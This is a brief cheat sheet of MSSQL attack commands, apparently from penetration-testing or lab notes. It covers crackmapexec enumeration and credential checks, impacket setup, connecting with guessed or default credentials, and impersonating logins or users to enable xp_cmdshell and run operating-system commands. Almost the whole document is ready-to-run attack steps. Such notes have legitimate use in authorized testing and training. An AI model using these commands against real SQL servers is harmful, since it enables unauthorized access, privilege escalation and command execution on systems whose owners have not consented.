# MSSQL Exploitation

## Enumeration

```bash
crackmapexec mssql $ip
```

## Check credentials

```bash
crackmapexec mssql 192.168.56.22 -u username -p password -d domain.com
crackmapexec mssql 192.168.56.22 -u vagrant -p vagrant
```

## Prepare impacket

```bash
cd ~/tools/
git clone https://github.com/SecureAuthCorp/impacket myimpacket
cd myimpacket
python3 -m virtualenv myimpacket
source myimpacket/bin/activate
git fetch origin pull/1397/head:1397
git merge 1397
python3 -m pip install .
```

## Connect to mssql

```bash
python3 mssqlclient.py -windows-auth domain.com/username:Password@sqlserver.domain.com
python3 mssqlclient.py -windows-auth sa:sa@sqlserver.domain.com
```

## Execute as login

```bash
enum_logins
exec_as_login <grantor>
enable_xp_cmdshell
xp_cmdshell whoami
```

## Execute as user

```bash
enum_users
exec_as_user <user>
enable_xp_cmdshell
# if dont have permission use enum_impersonate and execute as login
enum_impersonate
enum_db
# if and user can impersonate another user with db is_trustworthy_on
use <database>
exec_as_user <user>
enable_xp_cmdshell
xp_cmdshell whoami
```